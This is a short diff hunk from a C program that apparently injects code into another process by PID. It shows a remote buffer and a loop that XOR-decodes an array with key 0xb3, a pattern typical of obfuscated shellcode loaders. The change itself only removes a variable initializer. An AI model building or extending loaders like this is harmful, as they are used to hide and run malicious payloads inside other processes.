@@ -46,7 +46,7 @@ int main(int argc, char* argv[])
 	PVOID remoteBuffer;
 
 	printf("Injecting to PID: %i\n", atoi(argv[1]));
-    int i = 0;
+    int i;
     for (i = 0; i < sizeof(aa)-1; i++)
     {
         bb[i] = aa[i] ^ 0xb3;
